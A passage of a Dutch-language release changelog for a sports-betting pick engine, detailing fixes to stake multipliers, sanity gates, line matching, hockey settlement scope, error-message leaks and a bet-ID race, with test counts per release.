- **[P0]** `server.js:6203, 6208` — BTTS kelly-multiplier leest nu `cm.btts_yes` / `cm.btts_no` in plaats van `cm.over` / `cm.under`. Voorheen: learning-loop schreef BTTS-resultaten naar `football_btts_yes/no` buckets (detectMarket+updateCalibration deden dit al correct), maar de scan consumeerde `cm.over/under.multiplier` — cross-market contamination. Over-performance-boost lekte 1:1 door naar BTTS-stakes zonder BTTS-eigen leerbasis. `lib/calibration-store.js:13` uitgebreid met `btts_yes`, `btts_no`, `dnb_home`, `dnb_away`, `dc_1x`, `dc_12`, `dc_x2` default-entries.
- **[P1]** `server.js:6265, 6270, 6333, 6337, 6341` — DNB en Double Chance kregen nu een `cm.dnb_home/away?.multiplier ?? 1` en `cm.dc_1x/12/x2?.multiplier ?? 1` in de mkP stake-formule. Voorheen volledig zonder multiplier → systematisch onder-gestaked t.o.v. markten met wél multiplier → lagere `expectedEur` → dropped uit top-N ranking. Dat voedde het "altijd Over 2.5 Bet365" patroon.
- **[P1]** `lib/learning-loop.js:62-68` — Autotune formule herschreven. Oud: `Math.max(0.70, Math.min(1.20, 0.70 + wr * 1.0))` → 50% winrate gaf MAX boost 1.20. Maar voor 1.90 odds is break-even 0.526 (1/1.90), dus 50% winrate = -5% ROI — formule beloonde onderperformance. Nu profit-gedreven: `delta = profitPerBet * 0.03`, `multiplier = 1.00 + delta` in range [0.70, 1.30]. Positieve winst per bet → boost proportioneel, negatief → demp.
- **[P1]** `lib/learning-loop.js:62` — Sample-threshold verhoogd van `n >= 8` naar `n >= 20`. Bij n=8 en 1.90 odds is 95% CI van winrate ±18pp — multiplier-beweging op die schaal is noise, niet signal. 20 is pragmatisch minimum voor signal boven noise.

### Fixed — Signal discipline (Claude P1)

- **[P1]** `server.js:5823` — Cumulatieve signal-push cap van ±10pp op 1X2 voetbal. Individuele signalen (form ±5%, ref ±4%, H2H ±3%, congestion ±3%) hebben al caps, maar sommatie was uncapped en kon 15-25pp cumulatief worden. Sandefjord-class fake-edges van die omvang zijn nu structureel geblokkeerd zonder afhankelijkheid van één specifieke gate.
- **[P1]** `lib/picks.js:74` — `dataConfidence` voor 0-signal picks: vanaf nu hard drop (`if (sigCount === 0) return;`). Voorheen 40% confidence = picks zonder inhoudelijke signal-basis kwamen door als pure markt-devig kopieën. Geen model-basis → geen pick.
- **[P1]** `lib/model-math.js:414` — Pitcher reliability-factor wordt nu toegepast op `pitcherAdjustment.adj`. Voorheen: `pitcherReliabilityFactor()` retourneerde 0.7 voor rookies met <15 IP maar die factor werd nergens vermenigvuldigd met het adj. Rookie (3 starts) kreeg dezelfde ±6% gewicht als 20-start veteraan. Nu schaalt adj mee met reliability.
- **[P1]** `lib/picks.js:102` — `auditSuspicious` OR-logic. Oud: `probGap > 15 AND baseGap > 15 AND signalContrib < baseGap*0.3`. Nieuw: `probGapSuspect (probGap > 15 EN signal < 25%) OR baseGapSuspect (baseGap > 12 EN signal < 30%)`. Vangt fake-edges met signalContrib net boven oude AND-drempel maar nog steeds disproportioneel.
- **[P0]** `server.js:4338, 4343, 4389, 4393, 4424, 4429` — Baseball NRFI, F5 ML, F5 O/U kregen nu `_fixtureMeta` in de mkP-call. Voorheen missing → `applyPostScanGate` kon deze markten niet koppelen aan line-timeline voor execution-quality checks.

### Breaking

- Geen breaking changes voor callers van publieke `/api/*` endpoints.
- `lib/picks.js mkP()` dropt nu 0-signal picks — scan-bodies moeten altijd minimaal 1 `matchSignals` entry meegeven. Alle huidige callers doen dat.
- `calibration.json` persist gaat nu ook `btts_yes`/`btts_no`/`dnb_home`/`dnb_away`/`dc_1x`/`dc_12`/`dc_x2` keys schrijven. Bestaande persisted calib wordt bij eerste `saveCalib()` aangevuld met defaults.

### Tests
637 passed, 0 failed. Bestaande dedupe-test aangepast aan nieuwe semantiek (beste prijs ipv slechtste).

### Niet in deze release (follow-up v12.1)

Codex/Claude beide P1/P2: writePickCandidate logging voor football BTTS/O/U/DNB/DC + alle non-football secondary markets → near-miss UI volledig. mkP silent-drops aggregate emit. applyPostScanGate stats emit in orchestrator. Panic_mode trigger log. Baseball F5 ML `starterReliability.factor >= 0.85` hardcap. Hockey P1 O/U scope-filter indien api-sports dat labelt. Basketball/baseball/NFL/handball writePickCandidate toevoeging. Deze observability-uitbouw is mechanisch werk en geen correctness-bug — veilig als follow-up.

### Doctrine-vrijwaring

Stake-regime (drawdown_soft = Kelly 0.4), `MODEL_MARKET_DIVERGENCE_THRESHOLD = 0.07`, per-sport diversification cap, correlation-damping op league-day, `operator.max_picks_per_day` als user-setting, en het `HOCKEY_60MIN_BOOKIES` bookie-blacklist concept blijven ongewijzigd. Deze zijn eerder gevalideerd en werken zoals bedoeld.

---

## [11.3.32] - 2026-04-19

**Hotfix · stale-scan UI + NHL TT settlement-scope mismatch**

Twee onafhankelijke bugs die Codex vond in aparte review-passes. Beide verklaarden waarom eerdere scan-output contradictoir leek: scan-log zei "0 voetbal picks" maar UI toonde nog 2 oude NHL TT picks.

### Fixed

- **[P0]** **Stale-scan UI bug** (index.html:5523, :5607, :5627): frontend-filter `h.type === 'prematch' && h.picks?.length` verborg scans met 0 picks → UI bleef de laatste niet-lege prematch-scan tonen terwijl de echte nieuwste scan 0 picks had. Operator-symptoom: *"scan-log zegt 0 voetbal, ik zie toch nog dezelfde 2 oude bet365 picks, near-miss spreekt elkaar tegen"*. Fix: filter `&& h.picks?.length` weggehaald op 3 plekken (initial load, refresh handler, _lastScanTs init). `renderPicks()` toont al netjes "🚫 Geen picks in deze scan" bij lege array — dus na fix krijgt operator correcte realtime status.

- **[P0]** **NHL Team Total settlement-scope mismatch** (server.js:3585-3587): Unibet/Toto/BetCity/Ladbrokes settelen NHL team-totals op **60-min regular time** (zonder OT), terwijl onze λ-berekening (`expHome + 0.023`) en Poisson-output **full-game inclusief OT** zijn. Zonder filter liepen beide scopes door elkaar in `parsed.teamTotals` → Unibet's 60-min `Under 3.5 @ 1.92` kwam in dezelfde pool als Bet365's full-game `Under 3.5 @ 1.86` → `bestFromArr()` kon verkeerde bookie picken met verkeerde scope-match. Hockey ML deed dit onderscheid al via `HOCKEY_60MIN_BOOKIES` blacklist (server.js:3354); nu doet TT hetzelfde. Operator-symptoom: *"op Unibet is Under 3.5 regular time hoger dan wat EdgePickr als Bet365-pick toont"*. Fix: `parsed.teamTotals.filter(o => isOTBookieHockey(o.bookie))` sluit 60-min-only bookies uit bij pick-odds selectie.

### Why

v11.3.31 release-cycle toonde hockey-TT picks voor het eerst na dagen. Operator ontdekte dat die TT-picks op Unibet tegen betere odds beschikbaar waren. Codex tracede dat naar de settlement-scope mismatch: onze model-prob hoort bij full-game, maar pool van quotes bevatte beide scopes. En Codex vond parallel de stale-scan UI bug die verklaarde waarom eerder diagnose zo verwarrend was — scan-log zei één ding, UI toonde ander.

Beide bugs zijn runtime-bugs, geen doctrine-issues.

### Niet in deze release (follow-up)

- **Parser-level scope-detection**: Codex-advies in brief was om `bet.name` te checken op "Regular Time" / "Incl OT" labels en een `scope` veld toe te voegen aan `teamTotals[]`. Dat is methodologisch strakker dan bookie-blacklist. Nu nog niet gedaan omdat (a) het meer callsite-wijzigingen vereist (basketball/baseball/NFL/handball TT pools), (b) huidige bookie-blacklist aanpak is al proven voor hockey ML. Follow-up als blijkt dat api-sports inderdaad `bet.name` varianten per bookmaker teruggeeft.
- **Football 1X2/O/U/DNB/DC sanity-gate rollback**: Codex identificeerde deze als nog-live-suppressors maar liet de beslissing aan operator. Niet in deze release — wacht op scan-output na v11.3.32 om te zien of BTTS/hockey fixes + UI correctie genoeg zijn.
- **writePickCandidate voor BTTS/DNB/DC/O/U**: near-miss UI blijft voor die markten blind. Nodig voor echte observability.

### Tests
637 passed, 0 failed (UI fix geen nieuwe test; hockey TT bookie-filter-toevoeging is consistent met bestaande `HOCKEY_60MIN_BOOKIES` logica die al getest is via ML-paden).

---

## [11.3.31] - 2026-04-19

**Hotfix · methodologie-mismatch sanity-gates + sanity_fail observability**

Vervolg op Codex second-opinion na v11.3.30. Codex: *"BTTS wordt inhoudelijk verkeerd gegated. `calcBTTSProb()` is een H2H+form-model, geen market-derived probability. Daar een 7pp devig-gate op zetten met `passesDivergence2Way()` is methodologisch fout. Ik heb normale voorbeeldinputs doorgerekend waarbij BTTS direct 15-26 procentpunt van markt-devig afligt en dus altijd faalt."*

### Fixed

- **[CRITICAL]** Football BTTS (server.js:6173): verwijderd `passesDivergence2Way(bttsYesP, bttsNoP, ...)` gate. Vervangen door `h2hN >= 5` check. Reden: `calcBTTSProb()` (H2H + form-model) is niet market-devigged → devig-vergelijking is methodologisch mismatch → faalde structureel ook op legitieme BTTS-inschattingen. De Sandefjord-case (74% model vs 42% market) die oorspronkelijk tot v11.1.2 leidde was een **dun-H2H** probleem (n=2 samples). Een h2hN≥5 gate pakt die oorzaak direct aan zonder de methodologie-mismatch van een devig-gate.
- **[CRITICAL]** Hockey Team Totals (server.js:3587-3636): verwijderd `passesDivergence2Way(pOver, pUnder, ...)` gate op 4 callsites (home/away × over/under). Reden: `pOver = poissonOver(lambda, line)` is Poisson-based, niet market-devigged — zelfde methodologische mismatch als BTTS. Vervangen door λ-range sanity: `0.5 ≤ lambdaHome/Away ≤ 5.0 goals/game`. Buiten die range betekent data stuk, skip pick. Paired over/under aanwezigheid + price range 1.60-3.5 + edge-min blijven actief.
- **[HIGH]** Football 1X2 writePickCandidate (server.js:5904-5924): `sanity_fail` reject-reason nu gelogd. Pre-fix logde alleen `no_bookie_price / price_too_low / price_too_high / blowout_opp_too_low / edge_below_min`, maar niet `sanity_fail` — terwijl de `mkP()` call-sites wél op `sanityHomeFb/sanityAwayFb/sanityDrawFb.agree` checken. Near-miss UI was dus **blind** voor deze hele rejection-categorie. Nu format: `sanity_fail (div X.Xpp > Y.Ypp)`.
- **[HIGH]** `edge_below_min` reject-reason in 1X2: toont nu de **werkelijke** adaptieve drempel via `adaptiveMinEdge('football', side, min)` in plaats van alleen base `min`. Consistent met wat `mkP` daadwerkelijk afdwingt. Na v11.3.30 is dat 5.5% voor alle sides, maar als we later per-markt beleid herinvoeren blijft de log correct.

### Why

Scan-log 2026-04-19 08:41 op v11.3.30: 102 voetbal wedstrijden, 0 pre-match picks. Multi-sport: 0 picks. Near-miss UI: 1000 candidates, 54 geaccepteerd (5.4%), maar: (a) BTTS/DNB/DC hebben geen candidate-logging, (b) sanity_fail voor 1X2 werd niet gelogd, (c) edges op andere markten werden structureel onder de 7pp devig-gate voor BTTS en Team Totals weggevangen.

Codex finding was correct: de scan-gates voor markten waar model-prob **inherent** niet op dezelfde basis als market-devig ligt (BTTS = H2H/form, Hockey TT = Poisson) waren methodologisch fout toegepast. v11.1.2 / v11.2.1 introduceerde ze als over-correction op de Sandefjord operator-report, zonder onderscheid te maken tussen model-types.

### Niet in deze release (follow-up)

- Football BTTS/DNB/DC hebben nog geen eigen `writePickCandidate` logging. Bij nul picks uit die markten zien we niets in near-miss UI. Follow-up: voeg candidate-logging toe voor alle football secondary markten.
- `adaptiveMinEdge` logging in hockey/baseball/basketball/NFL/handball `writePickCandidate` callsites. Nu nog base-MIN_EDGE in de log.
- Als BTTS nu zinvolle picks gaat genereren maar qua resultaten slecht blijkt, kan een signal-quality gate (minimum signal-count of dataConfidence ≥ 0.70) worden toegevoegd zonder de foute devig-vergelijking terug te brengen.

### Tests
637 passed, 0 failed (ongewijzigd — BTTS/TT gate-tests waren indirect via end-to-end scan, geen directe unit-tests die breken op removal).

---

## [11.3.30] - 2026-04-19

**Hotfix · adaptiveMinEdge sample-trap volledig verwijderd**

### Fixed

- **[CRITICAL]** `adaptiveMinEdge()` in server.js:251-263 hield unproven markten permanent dood via tier-differentiatie. Oude drempels: `<30 settled bets → 8%`, `30-99 → 6.5%`, `≥100 → 5.5%`. Effect: **football_over** had ≥100 samples → 5.5% drempel → picks komen door. Alle andere markten (**football_1x2, football_btts, football_dnb, basketball_moneyline, hockey_moneyline, baseball_moneyline, baseball_nrfi, baseball_f5_ml**) hadden < 30 samples → 8% drempel → vrijwel nooit picks → geen samples toename → blijvend unproven. Operator-symptoom sinds 2026-04-18: elke scan alleen Over 2.5 voetbal picks, geen andere sport/markt door.
- **Nieuwe logica**: tier-differentiatie volledig verwijderd. `adaptiveMinEdge()` retourneert nu altijd `baseMinEdge` (5.5%). De parameters `sport` en `marktLabel` blijven voor backward-compat + toekomstig per-markt beleid, maar worden niet benut. Sample-cache refresh blijft lopen voor andere callers (autotune, diversification).
- Tests 2960-2994 herschreven voor passthrough-gedrag.

### Why

Operator-rapport 2026-04-19 10:00: *"Of Bet365 O2.5 picks, of helemaal niks, geen enkele andere sport, geen enkele andere markt, al 24 uur lang, op zaterdag EN zondag de 2 drukste sportdagen."*

Operator-redeneer 2026-04-19 10:30: *"Om data op te bouwen wil je toch sowieso eerst meer picks op alle markten verzamelen ipv meteen op 1 aan sturen, dan bouw je nooit data op op de anderen?"*

Dat is correct. Tier-differentiatie is in bootstrap-fase (weinig samples per markt) een chicken-and-egg trap: je hebt samples nodig om te calibreren, dus strenger zijn op markten zónder samples verhindert juist de calibratie. Risicobeheer ligt al bij 6 andere gate-lagen (sanity-gate 7pp, signal-quality, line-quality, execution-coverage, price-range, ≥1 paired bookie, dataConfidence). Een extra adaptieve drempel op top is overkill én contra-productief.

Dit volgt op drie eerdere fixes die het symptoom niet volledig raakten:
- v11.3.28: `MODEL_MARKET_DIVERGENCE_THRESHOLD 0.04 → 0.07` (half fix — 1X2 kwam iets vaker door, BTTS/Team Totals bleven geblokt)
- v11.3.29 (Codex-finding): `analyseTotal()` exact line-match `< 0.01` (fix voor valse Over 2.5 matches op 3.0-lines — eliminatede de nep-Over-2.5 picks maar liet de echte drempel-trap intact)
- v11.3.30 (dit release): adaptiveMinEdge tier-trap verwijderd

Screenshot van operator (near-miss UI) toonde 1000 candidates in 24u, 708 rejected via `edge_below_min` met edges typisch 4-5% (onder 5.5% base-drempel in de log). Dat betrof alleen de base-drempel-log; de **echte** drempel in `mkP` via `adaptiveMinEdge` was 8% voor die markten, dus ook picks met 6-7% edge werden stil gedropt zonder spoor in de near-miss UI.

### Niet in deze release (als v11.3.30 niet werkt)

Als deze versoepeling onvoldoende is, volgt v11.3.31 met gerichte rollback van v11.1.2 + v11.2.1 sanity-gates op markten waar model-prob inherent niet op dezelfde basis als marketdevig ligt (BTTS, Hockey Team Totals via Poisson). Alleen een "extreme guard" (>= 15pp) behouden voor Sandefjord-class fake edges. Dit zou het scan-gedrag terugbrengen naar v11.1.1 niveau (baseball ML + diverse markten werkten toen), met behoud van modulariteit en learning-loop extracties.

### Tests
638 passed, 0 failed.

---

## [11.3.29] - 2026-04-19

**P0 hotfix · Codex finding: football totals line-matching bug**

### Fixed

- **[P0]** `lib/picks.js:240` `analyseTotal()` gebruikte `Math.abs((o.point||0) - point) < 0.6` voor line-matching. Voor `point=2.5` matchte dit óók `2.0` en `3.0` (alternate totals = aparte markten). Omdat `find()` de eerste hit in outcomes-volgorde pakt, kon Bet365's Over 3.0 prijs geretourneerd worden terwijl de pick hardcoded gelabeld werd als "Over 2.5 goals" + `_fixtureMeta.line=2.5`. Over 3.0 prijs is structureel hoger (~2.5 vs ~1.9) → false edge → pick kwam hoog in ranking → bezette de 2 topPicks slots → drukte BTTS/1X2/DNB/multi-sport picks uit de selection. Fix: tolerance naar `< 0.01` (exacte match). Codex reproductie: outcomes=`[Over 3.0, Over 2.5]` + point=2.5 → pre-fix retourneerde 3.0 prijs, post-fix retourneert 2.5 prijs.
- 4 nieuwe regressietests: (1) `[Over 3.0, Over 2.5]` → pakt 2.5 prijs, niet 3.0. (2) `[Over 2.0, Over 2.5]` → pakt 2.5, niet 2.0. (3) alleen `[Over 2.0, Over 3.0]` → geen match (best.price=0, avgIP=0). (4) 2 preferred bookies met exact 2.5 + 1 noise-bookie met 3.5 → beste 2.5-prijs wint, consensus negeert 3.5.

### Why

Operator-rapport 2026-04-19 08:00: "Sinds 2026-04-18 09:33 alleen Over 2.5 Bet365 voetbal picks, elke scan 2 stuks, geen BTTS/1X2/DNB/ML." Mijn v11.3.28 hotfix (threshold 0.04 → 0.07) loste het patroon niet op. Codex second-opinion vond de echte P0 — in productie-code die al > 1 sprint live was, maar waarvan het effect pas sichtbaar werd toen de combinatie van (a) autotune `over × 1.09` kelly-multiplier + (b) signal-gates op andere markten toevalllig de nep-Over-2.5 picks tot top-2 maakte.

Codex-aanbeveling: eerst P0 line-fix, daarna DB-check op `pick_candidates` sinds 09:33 voor BTTS/1X2/DNB rejection-reasons, pas dan eventuele gate-tuning (Optie A+C uit `docs/CODEX_BRIEF_2026-04-19_scan_pipeline.md`).

### Follow-up (NIET in deze release)

- Per-sport scans (basketball/hockey/baseball/NFL/handball) gebruiken ook `< 0.6` tolerance via `filter()`. Dat is design-intent (NBA 220/220.5/221 mogen als "gelijk" geteld). Blijft voor nu; revisit als gebruiksdata aantoont dat het ook daar fout is.
- Sanity-gate herziening (BTTS/Poisson model-vs-markt mismatch) wacht op DB-rejection-data na deze fix live staat.

### Tests
638 passed, 0 failed (+4 regressietests voor analyseTotal).

---

## [11.3.28] - 2026-04-18

**Hotfix · sanity-gate threshold te strikt (operator-rapport 22:00)**

### Fixed

- **[CRITICAL]** Scan-pipeline regressie: sinds 2026-04-18 14:00-scan kwamen er **alleen Over 2.5 voetbal picks** (bij Bet365+Unibet preferred; bij alleen Unibet 0 picks). Geen BTTS, geen 1X2, geen DNB, geen DC, geen basketball/hockey/baseball ML. Root cause: v11.1.2 (09:30) + v11.2.1 (09:52) zetten `MODEL_MARKET_DIVERGENCE_THRESHOLD = 0.04` (4pp) als sanity-gate op 11 markten. Cumulatieve signal-pushes (referee + H2H + form + predictions + congestion + weather) zitten legitiem op **5-8pp** voor 1X2/BTTS/DNB. Over 2.5 voetbal heeft weinig signals (≤3pp push gemiddeld) en overleefde daardoor als enige. Fix: threshold **0.04 → 0.07**. Behoudt Sandefjord-class 34pp guard, laat legitieme signal-based picks door.
- **[CRITICAL]** Bijbehorende regressie: v11.2.1 verhoogde `ov.length && un.length` naar `ov.length >= 2 && un.length >= 2` op alle O/U markten (basketball, hockey, baseball, NFL). Bij alleen Unibet preferred + Pinnacle/WH als sharp-anchor zijn vaak ≥2 paired bookies per line niet haalbaar op Amerikaanse sports → **nul** O/U picks. Rollback naar `&&` (1+ elk): de sanity-gate zelf (nu op 7pp) vangt al af wanneer een ene-bookie-devig te wild is. Odd/Even (≥3) en NRFI (≥3 + pitcherSig.valid) blijven strenger want exotic markets met inherent dunne pools.
- Test `modelMarketSanityCheck: default threshold is 0.04` geupdate naar 0.07 + extra assertie voor 0.08 → fail.

### Why
Operator-rapport 2026-04-18 22:00 "de hele dag alleen Over 2.5 voetbal sinds begin middag". Diagnose via git log: v11.1.2 + v11.2.1 beide vanochtend gepusht, eerste operationele scan op 14:00. Over 2.5 voetbal had al v11.1.2 gate vóór v11.2.1, en heeft de laagste signal-push (Poisson + tsAdj + weather ≤ 3pp gecombineerd) → enige markt die de 4pp gate passeerde. Bug was een **overreactie** op Bart's 's ochtends-rapport "Sandefjord BTTS Nee 34pp fake edge". Originele Sandefjord was een **dun-H2H** probleem (n=2 samples zonder shrinkage), geen generieke "signal-push te hard". 4pp was te bot; 7pp blokkeert nog steeds Sandefjord-class (≥15pp) maar laat 5-7pp legitieme signal-combinatie door.

### Tests
634 passed, 0 failed.

---

## [11.3.27] - 2026-04-18

**Phase 10 · reviewer follow-up fixes (second-pass closure)**

Concrete follow-up op de tweede reviewer-pass die 5 issues vond na v11.3.26:

### Fixed

- **[HIGH]** `/api/admin/v2/bookie-concentration` en `runBookieConcentrationCheck` lazen `bets.bookie` terwijl de canonical column `tip` heet. Endpoint gaf `500 "column bets.bookie does not exist"`, watcher was blind. Fix: beide paden lezen nu `tip` en mappen naar `bookie` vóór `computeBookieConcentration` (pure helper ongewijzigd). Tevens: endpoint lekt geen raw DB-error meer.
- **[MED]** `bet_id` race: nieuwe migratie `docs/migrations-archive/v11.3.27_bets_bet_id_sequence.sql` koppelt `bet_id` aan Postgres sequence via `nextval`. `writeBet` probeert nu eerst tier-1 (DB-sequence, true atomic) via insert-zonder-bet_id + `.select('bet_id')`; alleen als de sequence ontbreekt (pre-migrate schema) valt het terug op tier-2 retry-loop met 10 attempts + exponential backoff (10ms → 5s cap). Eerdere 5-attempt MAX+1 faalde onder reviewer's 6-concurrent repro.
- **[MED]** Resterende raw `error.message` leaks in admin/observability paden gefixt: `admin-backfill.js`, `admin-inspect.js`, `admin-model-eval.js`, `admin-quality.js`, `admin-signals.js`, `admin-timeline.js`, `clv.js`. Alle `if (error) return res.status(500).json({ error: error.message })` vervangen door log + generic `Interne fout · check server logs`.
- **[LOW]** `pick-distribution` endpoint implementeert nu daadwerkelijk `?preferredOnly=1`: leest `req.user`'s `preferredBookies` via `loadUsers` (fallback: admin) en filtert candidates op case-insensitive substring-match — consistent met `lib/odds-parser.js bestOdds` filter. Response bevat nu `preferredOnly` + `preferredBookies` velden zodat client-side duidelijk is welk filter actief is.
- **[LOW]** `test.js` PUBLIC_PATHS-test gebruikt nu parse-from-server.js i.p.v. hardcoded kopie met stale `/api/status`. Asserts ook dat `/api/health` wél public is. Security-drift detecteert nu de echte runtime-constante.

### Changed

- README tests-count `624` → `634`.
- 2 nieuwe integration tests: `bookie-concentration uses tip column` + `pick-distribution preferredOnly filters on user prefs`.

### Migration required

`docs/migrations-archive/v11.3.27_bets_bet_id_sequence.sql` moet op Supabase worden toegepast voor de sequence-based allocator actief wordt. Commando:

```
node scripts/migrate.js docs/migrations-archive/v11.3.27_bets_bet_id_sequence.sql
```

Idempotent (`CREATE SEQUENCE IF NOT EXISTS` + `setval(... MAX+1)`). Tot die tijd gebruikt `writeBet` de tier-2 retry-loop met 10 attempts en exponential backoff — gemitigeerd maar niet race-proof onder extreme concurrency.

### Tests

634 passed · 0 failed (was 632). Server boot groen.

## [11.3.26] - 2026-04-18

**Phase 9.1 + 9.2 · frontend DOM hardening + scan-orchestrator extractie**

### Fixed

- **[P1 Codex #1]** `index.html` analyze error-suggestions: gemigreerd van inline `onclick="...${escHtml(m.match...)}..."` naar DOM nodes + event-delegation via `data-match` attribuut. De inline-handler-met-string-concat was de specifieke XSS-fragile path die reviewer #1 als P1 flagde. Andere innerHTML-paths met geëscapete vars blijven (niet exploitabel met huidige escHtml).

### Added

- **`lib/scan/orchestrator.js`** — `runFullScan` orchestrator extracted uit server.js (182 regels). Coördineert pre-scan prep (setPreferredBookies, refreshActiveUnitEur, recomputeStakeRegime) + multi-sport scan (football via runPrematch + NBA/NHL/MLB/NFL/handball in Promise.all) + kill-switch + correlatie-damping + diversification + saveScanEntry + notify + logScanEnd. Factory met ~25 deps (getter-pattern voor alle mutable state: `_activeUnitEur`, `_activeStartBankroll`, `_currentStakeRegime`, `_sportCapCache`, `_marketSampleCache`). Lazy-init om hoisting-issues met later-declared helpers te vermijden.
- De per-sport scan bodies (runPrematch, runBasketball, runHockey, runBaseball, runFootballUS, runHandball) blijven in server.js. Ze bevatten dense business-logic (3-4k regels) die eerst per-sport integration-tests verdient vóór veilige extractie — dat is het correcte volgende stuk voor Phase 10 na deze test-infra.

### Changed

- server.js netto **-148 regels** (7783 → 7635).

### Tests

632 passed · 0 failed. Server boot groen. Gedrag identiek — lift-and-shift met getter-pattern voor mutable state.

## [11.3.25] - 2026-04-18

**Phase 8.1 + 8.2 · route integration tests + empirical pick-distribution**

Reviewer Codex #2's H4 ("coverage te laag op de gevaarlijkste codepaden") en
aanbeveling voor empirical reporting adresseren zonder nieuwe deps.

### Added

- **`lib/testing/route-harness.js`** — lightweight Express-router test-harness.
  `callRoute(router, { method, path, user, query, params, body })` dispatcht
  requests via `router.handle()` met mock req/res, zonder HTTP-overhead of
  supertest devDep. Export ook `makeNoopAuthMiddleware()` voor
  requireAdmin-bypass in tests.
- **8 route-level integration tests** (`test.js`):
  - `GET /health` returns `{ ok, ts }`.
  - `GET /bets` scoped per user.
  - `GET /bets/correlations` groepeert op wedstrijd.
  - `DELETE /bets/:id` rate-limit + invalid-id paths.
  - Admin 500-pad lekt géén raw `e.message` (regression tegen H3).
  - `GET /version` returns app-meta version.
  - `GET /admin/v2/pick-distribution` 3D aggregation test.
- **`GET /api/admin/v2/pick-distribution`** in `lib/routes/admin-inspect.js`:
  3D aggregatie van pick_candidates per (market_type × bookie × rejection_reason)
  over laatste N uur. Joint `pick_candidates` met `model_runs` voor market_type.
  Returnt distribution-tree + bookieSummary met acceptance-rate. Direct
  data-driven antwoord op "Over 2.5 / Bet365 / Unibet" bias-vraag — reviewer
  Codex #2's expliciete aanbeveling.

### Changed

- Test count: 624 → **632 passed** (+8 integration tests).

### Fixed

(niets — pure additions, geen regressie-fixes deze commit.)

## [11.3.24] - 2026-04-18

**Phase 7.2 + 7.3 · dedup + docs sync (Codex #1 + Codex #2)**

### Fixed

- **[A1]** `lib/db.js` is nu dedicated aan user-management. Dead-code copies van `readBets`, `writeBet`, `deleteBet`, `calcStats`, `insertBetWithSchemaFallback`, `loadScanHistory`, `loadScanHistoryFromSheets`, `saveScanEntry` en `SCAN_HISTORY_MAX` verwijderd. De canonical leeft in `lib/bets-data.js` (v11.3.21); server.js heeft zijn eigen scan-history implementaties. Geen drie autoriteiten meer.
- **[A2]** `PUBLIC_PATHS` export uit `lib/config.js` verwijderd (was stale kopie met `/api/status` er nog in). Single source of truth leeft nu in `server.js`.
- **[A3]** `lib/calibration-store.js` `save()` schrijft nu ook naar de fallback-file. Eerder las `loadSync()` de file als noodfallback, maar werd die nooit bijgewerkt na Supabase-save → schijnveiligheid bij outage.
- **[D1]** `README.md`: `API_SPORTS_KEY` → `API_FOOTBALL_KEY` (matched runtime `server.js:1161`).
- **[D2]** `README.md` test-count `315` → `624`; `docs/CODE_REVIEW_PREP.md` `523` → `624`.
- **[D4]** `render.yaml`: `ODDS_API_KEY` weg (was nergens in runtime-code actief).

### Changed

- `lib/db.js`: 271 → ~90 regels (user management only).
- `lib/config.js`: −1 export (`PUBLIC_PATHS`).
- `lib/calibration-store.js`: fallback-file write-back toegevoegd.

### Tests

624 passed · 0 failed (onveranderd — pure cleanup). Server boot groen.

## [11.3.23] - 2026-04-18

**Phase 7.1 · reviewer-bugs live fixes (Codex #1 + Codex #2)**

Twee onafhankelijke reviews (Codex #1 op v11.1.0, Codex #2 op v11.3.x) vonden overlappend dezelfde kritieke bugs. Dit commit fixt alle live defects + port de patches die Codex #1 al in een andere working tree had toegepast.

### Fixed

- **[C1]** `lib/integrations/nhl-goalie-preview.js`: `safeFetch` wordt nu correct aangeroepen met 2-arg interface (`url, { headers, allowedHosts }`) en de returnwaarde wordt als parsed data behandeld i.p.v. `Response`-object. Eerdere 3-arg call + `resp.ok`/`resp.json()` was effectief stuk — goalie-preview data kwam niet binnen.
- **[C2]** `schedulePreKickoffCheck` + `scheduleCLVCheck` + odds-monitor gebruiken nu `bet.datum` + `bet.tijd` via nieuwe pure helper `lib/runtime/bet-kickoff.js` (DST-aware, Europe/Amsterdam). Eerdere code gebruikte `nowAms`-datum → bets >1 dag vooruit verkeerd/niet gepland.
- **[C3]** `POST /api/bets` + `lib/bets-data.js writeBet` gebruiken nu atomaire retry-on-unique-violation pattern met bounded 5 attempts. Geen `Math.max(...ids)+1` meer op client-side bets-array → geen race-condition bij dubbelkliks of concurrent writes.
- **[H1]** Nieuwe public `GET /api/health` endpoint in `lib/routes/health.js` voor Render keep-alive. Minimale `{ ok: true, ts }` payload, in `PUBLIC_PATHS`, géén auth. Eerdere keep-alive hit `/api/status` (niet meer public) → 401 → geen anti-sleep werking.
- **[H3]** Admin/observability paden lekken geen raw `e.message` meer naar response-body. Alle 500-paden in `lib/routes/admin-*.js`, `lib/routes/clv.js` en `server.js` loggen server-side en sturen generieke `Interne fout · check server logs`. Nieuwe helper `lib/utils/http-error.js` documenteert de canonical responder.
- **[F1]** (Codex #1) `checkOpenBetResults` in `lib/runtime/check-open-bets.js` gebruikt nu `bet.userId` als owner-scope wanneer beschikbaar. Bij globale cron-run voorkomt dit dat settled bets zonder user-scope worden geschreven én dat push naar `null`-user gaat ipv de daadwerkelijke owner.
- **[F2]** (Codex #1) `recomputeStakeRegime` query is nu admin-scoped (`user_id.eq.<admin>,user_id.is.null`) i.p.v. alle users. Stake-regime-engine wordt niet gecontamineerd door niet-admin bets.
- **[F3]** (Codex #1) Zowel `lib/db.js readBets` als `lib/bets-data.js readBets` preserve nu `userId` in bet-mapping, voorwaarde voor F1.
- **[F4]** (Codex #1) Live tracker in `index.html` detecteert nu ook `Under X.5` irreversible loss tijdens live (`totalGoals > line`) en triggert meteen `syncTrackerFromResultsCheck()` + push-notif. Plus nieuwe helper `isLiveIrreversiblyLost` in `lib/runtime/operator-actions.js`.

### Added (tests)

- Nieuwe regressietests voor C1/C2/C3/F3/F4/H1/H2:
  - `parseBetKickoff`: ISO, HH:MM+datum today/tomorrow/3-days-ahead, invalid, fallback.
  - `isLiveIrreversiblyLost`: Under 2.5 broken, Under safe, BTTS Nee both-scored, Over niet.
  - `bets-data.readBets` preserves `userId`.
  - `writeBet` retries on unique-violation (mocked Supabase race).
  - `PUBLIC_PATHS` structural test: `/api/status` niet public, `/api/health` wel.
  - `nhl-goalie-preview` module smoke-require (post-fix).
  - `health-route` factory exports correct router.

### Changed

- server.js netto +29 regels (7796 → 7825) — netto gelijk (C2 verkort, H1/H3 kleine toevoegingen).
- Test count: 609 → **624 passed** (+15 regressietests), 0 failed.

### Files

- Nieuw: `lib/runtime/bet-kickoff.js`, `lib/routes/health.js`, `lib/utils/http-error.js`.
